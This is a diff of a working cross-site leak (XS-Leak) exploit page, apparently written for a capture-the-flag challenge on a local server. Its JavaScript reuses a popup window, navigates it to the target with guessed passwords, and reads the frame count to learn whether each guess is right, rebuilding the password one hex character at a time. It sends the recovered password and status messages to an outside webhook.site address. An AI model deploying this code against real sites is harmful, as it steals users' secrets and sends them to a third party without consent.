@@ -1,70 +1,103 @@
 <!DOCTYPE html>
 <html>
-<head><title>Final XS-Leak Exploit</title></head>
+<head><title>Window Reuse XS-Leak</title></head>
 <body>
-<h1>XS-Leak Password Extraction</h1>
+<h1>XS-Leak - Window Reuse Technique</h1>
 <button id="startBtn" onclick="start()" style="padding:10px 20px; font-size:16px;">Start Exploit</button>
 <pre id="output"></pre>
 <script>
 const TARGET = 'https://127.0.0.1:9999/';
 const WEBHOOK = 'https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/';
 const CHARSET = '0123456789abcdef';
-let known = 'lebah';
-let testing = false;
 
 function log(msg) {
     document.getElementById('output').textContent += msg + '\n';
+    console.log(msg);
 }
 
-// Check if iframe exists by attempting to access win[0]
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+const waitFor = async (f, timeout = 5000) => {
+    const start = Date.now();
+    while (true) {
+        if (await f()) return true;
+        if (Date.now() - start > timeout) return false;
+        await sleep(10);
+    }
+};
+
+// Open window ONCE and reuse it
+const win = window.open('about:blank');
+if (!win) {
+    alert('Popup blocked! Please allow popups and refresh.');
+    throw new Error('Popup blocked');
+}
+
 async function check(candidate) {
-    if (testing) return false; // Prevent overlapping tests
-    testing = true;
-    
-    return new Promise((resolve) => {
-        const win = window.open(TARGET + '?pass=' + encodeURIComponent(candidate));
+    try {
+        // Navigate the SAME window to about:blank first
+        win.location = 'about:blank';
+        await waitFor(() => win.length === 0, 2000);
+        await sleep(100);
         
-        setTimeout(() => {
-            let hasFrame = false;
+        // Navigate to target URL
+        const url = TARGET + '?pass=' + encodeURIComponent(candidate);
+        win.location = url;
+        
+        // Wait for cross-origin error (page loaded)
+        await waitFor(() => {
             try {
-                // If win or win[0] access triggers cross-origin error, frame exists
-                const frame = win ? win[0] : null;
-                hasFrame = (frame !== undefined && frame !== null);
-            } catch (e) {
-                // Cross-origin error = frame exists
-                hasFrame = e.message.includes('cross-origin') || e.message.includes('Blocked');
+                win.origin;
+                return false;
+            } catch {
+                return true;
             }
-            
-            if (win && !win.closed) {
-                try { win.close(); } catch(e) {}
-            }
-            testing = false;
-            resolve(hasFrame);
-        }, 1000); // 1 second per test
-    });
+        }, 3000);
+        
+        // Wait a bit for iframe to render if it exists
+        await sleep(200);
+        
+        // Check frame count
+        try {
+            const frameCount = win.length;
+            return frameCount > 0;
+        } catch (e) {
+            log(`  Error reading win.length: ${e.message}`);
+            return false;
+        }
+    } catch (e) {
+        log(`  Error in check: ${e.message}`);
+        return false;
+    }
 }
 
 async function start() {
     document.getElementById('startBtn').disabled = true;
-    log('Starting exploit...\n');
+    log('Starting exploit with window reuse technique...\n');
+    
+    fetch(WEBHOOK + '?status=reuse_started').catch(e=>{});
     
     // Verify oracle
     log('[*] Verifying oracle...');
     const good = await check('lebah');
-    const bad = await check('lebahZ');
     log(`  "lebah": ${good} (should be true)`);
+    
+    const bad = await check('lebahZ');
     log(`  "lebahZ": ${bad} (should be false)\n`);
     
     if (!good || bad) {
-        log('❌ Oracle failed! Make sure bot is logged in.');
+        log('❌ Oracle failed!');
+        fetch(WEBHOOK + '?error=oracle_failed').catch(e=>{});
         return;
     }
     
     log('✅ Oracle working!\n');
     
-    // Leak password
-    for (let pos = 0; pos < 6; pos++) { // 6 hex chars after "lebah"
-        log(`[*] Position ${pos+1}/6...`);
+    let known = 'lebah';
+    
+    // Leak 12 hex chars
+    for (let pos = 0; pos < 12; pos++) {
+        log(`[*] Position ${pos+1}/12...`);
         let found = false;
         
         for (let c of CHARSET) {
@@ -91,9 +124,15 @@ async function start() {
     log('PASSWORD: ' + known);
     log('========================================');
     fetch(WEBHOOK + '?PASSWORD=' + known).catch(e=>{});
+    
+    // Close the reused window
+    if (win && !win.closed) {
+        win.close();
+    }
 }
 
 log('Click "Start Exploit" button when ready!\n');
+log('Note: Allow popups for this page.\n');
 </script>
 </body>
 </html>
